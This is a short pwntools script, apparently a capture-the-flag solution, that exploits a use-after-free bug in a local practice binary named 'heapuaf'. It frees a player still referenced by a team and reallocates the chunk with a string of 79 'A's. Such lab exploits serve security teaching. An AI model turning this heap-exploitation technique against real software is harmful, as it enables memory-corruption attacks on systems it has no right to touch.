#!/usr/bin/python 
from pwn import *

def add_player(name, num):
	r.sendline("1")
	r.sendline(name)
	r.sendline(num)

def rem_player(player_id):
	r.sendline("2")
	r.sendline(player_id)

def list_players():
	r.sendline("3")

def add_to_team(player_id):
	r.sendline("4")
	r.sendline(player_id)

def list_team():
	r.sendline("5")

#Run as local process
#r = process('./heapuaf')

#Run as Remote Process
r = remote('127.0.0.1', 1337)

r.recvuntil('Choice: ')

add_player("player1", "100")
add_player("player2", "200")
#list_players()
add_to_team("2")
#list_team()
rem_player("2")
add_player("A" * 79, "300")
list_team()



r.interactive()
